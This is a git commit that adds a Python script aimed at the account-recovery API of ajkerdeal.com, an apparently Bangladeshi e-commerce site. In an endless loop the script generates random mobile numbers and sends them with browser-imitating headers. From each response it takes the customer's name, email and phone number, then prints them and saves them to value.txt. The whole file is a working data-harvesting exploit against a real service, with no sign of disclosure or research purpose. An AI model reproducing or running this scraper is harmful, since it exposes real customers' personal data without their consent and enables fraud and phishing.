e5dd0ede77fe9f993980e87146a86fe898944964
sharifulislam141 <masudranadarkwolf@gmail.com>
2023-02-15 10:59:54 +0600

    Done

---
+++ main.py
@@ -0,0 +1,66 @@
+'''
+
+
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
+'''
+import requests
+from random import randint
+from bs4 import BeautifulSoup
+filename = "value.txt"
+def phoneNumber():
+    number = str("01")
+    number1 =str(randint(6,9))
+    number2 = str(randint(10000000,99999999))
+    number3 =number + number1 + number2
+    return(number3)
+while True:
+    
+    try:
+        
+        number =  phoneNumber()
+        url = "https://api.ajkerdeal.com/recover/accountrecoverylist"
+        values =  {"MobileOrEmail":f"{number}","Type":"2"}
+        e_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36",
+        "Sec-Ch-Ua-Platform": "Windows",
+        "Origin": "https://ajkerdeal.com",
+        "Sec-Fetch-Site": "same-site",
+        "Sec-Fetch-Mode":"cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://ajkerdeal.com/",
+        "Accept-Encoding": "gzip, deflate",
+       "Accept-Language": "en-US,en;q=0.9"
+       } 
+        response = requests.post(url,headers=e_headers,data=values)
+
+ 
+        json_data = response.json()
+        customer_name = json_data["Data"][0]["CName"]
+        customer_email = json_data["Data"][0]["CEmail"]
+        customer_mobile = json_data["Data"][0]["CMobile"]
+        print(f"Name: {customer_name}")
+        print(f"Email: {customer_email}")
+        print(f"Mobile: {customer_mobile}")
+        with open("value.txt", "w") as f:
+    # Write the variables' values to the file
+            f.write(f"Name: {customer_name}\n")
+            f.write(f"Email: {customer_email}\n")
+            f.write(f"Mobile {customer_mobile}\n")
+            f.write("\n")
+        print(number)
+    except Exception as e:
+        print(f"Error: {e}")
+         
+
+'''
+    txt = r.content
+    text = str(txt,'UTF-8')
+    userinfo = str(values)
+    if "successful!" in text:
+        print("Successful",values)
+        file.write(userinfo+'\n')
+        
+    else:
+        print("failed",values)
+'''
+ 
